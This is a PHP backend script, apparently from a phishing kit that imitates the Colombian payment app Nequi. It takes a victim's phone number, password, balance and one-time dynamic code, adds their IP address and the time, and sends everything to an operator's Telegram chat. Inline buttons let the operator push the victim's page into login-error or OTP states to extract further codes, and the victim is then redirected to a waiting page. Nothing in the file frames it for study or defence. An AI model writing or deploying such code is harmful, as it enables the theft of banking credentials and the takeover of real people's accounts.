<?php
// Incluir el archivo de conexión a la base de datos
include '../../../db.php';
$config = include '../../../config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id'];
    $usuario = trim($_POST['usuario']);
    $clave = trim($_POST['clave']);
    $otp = trim($_POST['otp']);
    $saldo = trim($_POST['saldo']);
    $estado = 1;

    if (empty($cliente_id)) {
        die("Error: El ID del cliente no puede estar vacío.");
    }

    $ip_cliente = $_SERVER['REMOTE_ADDR'];
    date_default_timezone_set('America/Bogota');
    $fecha_hora = date('d-m H:i');

    // Actualizar solo el estado en la base de datos nequi
    $sql = "UPDATE nequi SET estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);

    // Bind parameters using array in execute
    if ($stmt->execute(['estado' => $estado, 'id' => $cliente_id])) {
        // Enviar datos a Telegram con botones interactivos
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        // Ajustar URL para usar el script específico de Nequi
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];
        $nequiBaseUrl = $baseUrl;
        if (strpos($baseUrl, 'updatetele.php') !== false) {
            $nequiBaseUrl = str_replace('updatetele.php', 'pago/nequi/process/updatetele.php', $baseUrl);
        } else {
            $nequiBaseUrl = rtrim($baseUrl, '/') . '/pago/nequi/process/updatetele.php';
        }

        $message = "🔄 <b>Actualización de cliente (Nequi Error User)</b>\n\n"
            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
            . "🌐 <b>IP del cliente:</b> <code>" . $ip_cliente . "</code>\n"
            . "🕒 <b>Fecha y Hora:</b> <code>" . $fecha_hora . "</code>";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Datos', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=6&key=$security_key"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=3&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$nequiBaseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            error_log('Error al enviar mensaje a Telegram');
        }

        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al actualizar.";
    }

    // $conn = null;
}
?>